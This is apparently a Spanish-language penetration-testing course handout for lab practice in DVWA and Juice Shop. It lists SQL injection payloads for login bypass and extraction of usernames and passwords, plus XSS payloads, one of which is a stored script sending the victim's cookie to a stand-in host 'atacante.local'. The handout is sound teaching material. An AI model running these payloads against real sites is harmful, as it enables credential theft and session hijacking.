# 🎯 Payloads de Ejemplo — SQLi y XSS — Sesión 4

Payloads manuales para practicar antes de automatizar con sqlmap o Burp Intruder.

---

## 🔹 SQL Injection

| Payload | Objetivo |
|---|---|
| `' OR '1'='1` | Bypass de autenticación clásico |
| `' OR '1'='1' -- ` | Igual al anterior, comentando el resto de la consulta |
| `' UNION SELECT null, null -- ` | Detectar número de columnas (ajustar cantidad de `null`) |
| `' UNION SELECT user(), database() -- ` | Extraer usuario y base de datos actual |
| `' UNION SELECT username, password FROM users -- ` | Extraer credenciales (ajustar nombres de tabla/columnas) |

> 💡 Practica esto en DVWA con seguridad en nivel "low" primero, luego sube el nivel de dificultad para ver cómo cambian las protecciones.

## 🔹 Cross-Site Scripting (XSS)

### XSS reflejado (se ejecuta inmediatamente al cargar la respuesta)

```html
<script>alert('XSS')</script>
```

```html
<img src=x onerror=alert('XSS')>
```

### XSS almacenado (queda guardado en la base de datos, se ejecuta cada vez que alguien ve el contenido)

```html
<script>document.location='http://atacante.local/robo?cookie='+document.cookie</script>
```

> 💡 En Juice Shop, prueba el campo de búsqueda o comentarios de producto — son puntos clásicos de XSS almacenado.

---

## ⚠️ Importante

Estos payloads son para el entorno de laboratorio (DVWA/Juice Shop) exclusivamente. El objetivo es que entiendas el mecanismo de la vulnerabilidad para poder documentarla correctamente en el reporte (sección "Pruebas realizadas" de la plantilla).

## ✅ Checklist de esta fase

- [ ] Ejecuté al menos un payload de SQLi manual con éxito
- [ ] Ejecuté un XSS reflejado y uno almacenado
- [ ] Documenté cada payload usado + captura de pantalla como evidencia
